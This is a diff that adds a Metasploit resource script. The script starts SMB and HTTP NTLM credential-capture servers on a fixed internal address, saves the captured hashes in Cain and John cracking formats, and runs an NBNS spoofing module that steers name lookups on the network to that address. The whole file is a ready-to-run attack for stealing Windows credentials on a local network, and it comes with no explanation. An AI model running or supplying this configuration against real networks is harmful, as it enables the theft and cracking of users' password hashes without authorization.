@@ -1,0 +1,17 @@
+use auxiliary/server/capture/smb
+set srvhost 172.17.0.108
+set cainpwfile /tmp/cain-smb
+set johnpwfile /tmp/john-smb
+set logfile /tmp/logfile
+run
+use auxiliary/server/capture/http_ntlm
+set srvhost 172.17.0.108
+set srvport 80
+set uripath /
+set cainpwfile /tmp/cain-http
+set johnpwfile /tmp/john-http
+set logfile /tmp/logfile
+run
+use auxiliary/spoof/nbns/nbns_response
+set spoofip 172.17.0.108
+run
